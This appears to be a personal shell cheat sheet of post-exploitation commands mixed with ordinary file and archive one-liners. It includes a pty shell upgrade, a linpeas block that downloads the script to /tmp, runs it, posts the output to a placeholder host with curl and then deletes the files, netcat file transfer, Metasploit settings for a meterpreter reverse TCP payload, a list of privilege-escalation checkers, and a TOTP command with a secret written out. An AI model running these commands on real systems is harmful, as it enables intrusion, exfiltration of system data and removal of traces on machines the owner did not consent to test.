```sh
# tty
python3 -c 'import pty; pty.spawn("/bin/sh")'

# netstat
netstat -ano -p tcp | grep tcp

# ssh with key
mcedit k.key
chmod 600 k.key
ssh -i './k.key' root@example.com


# linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > /tmp/l.sh
chmod +x /tmp/l.sh; 
/tmp/l.sh > /tmp/.l; # flag -a = all (with sudo brute) flag -r = api regex search (time too long)
curl -X POST -T /tmp/.l --silent http://ip
rm /tmp/l.sh; rm /tmp/.l; 


# ssh download file
scp -i './k.key' root@example.com:/tmp/.l ./linpeas.txt
scp root@example.com:/root/.ssh/linpeas.txt ./linpeas.txt


# nc
echo "asdsad" > nc -v -u -q 0 -n 127.0.0.1 1234          # send file or text

curl -F "data=@/tmp/l.txt" --silent http://127.0.0.1:1234
nc -v -l -N -w 3 -p 1234 > text.txt                      # receive to file


# DANTE start, stop
service danted start; service apache2 start; service danted status;
service danted stop; service apache2 stop; service danted status; exit


# find last day changed files
find ./ -type f -mtime -240 -printf "%f\n" | zip -@ ./3.zip
find ./*.pdf -type f -mtime -1 -printf "%f\n"


# count
find ./ -type f -mtime -240 -ls | wc -l
find ./*.pdf -type f -mtime -240 -mtime +180 -ls | wc -l


# find and zip archive last year // mtime in days
find ./*.pdf -type f -mtime -240 -mtime +180 -printf "%f\n" | zip -@ ./3.zip


# bigest 20 files in folder
du -a ./ | sort -n -r | head -n 20 
find ./ -type f -mtime -240 | du -a ./ | sort -n -r | head -n 120


# zip with password
zip -e -r {file.zip} {./folder/}
zip -e -r notable.zip ./ {password}


# ============================================

# metasploit

set lport 8090
set lhost 127.0.0.1
set payload linux/x86/meterpreter_reverse_tcp


# privs checkers

- PEASS
- linEnum
- linuxprivchecker
- unix-privesc-checker

# two factor
oathtool -b --totp '2IIA NNLA CZRT U6VD NTZK YDOA 7C2B BNNY'

```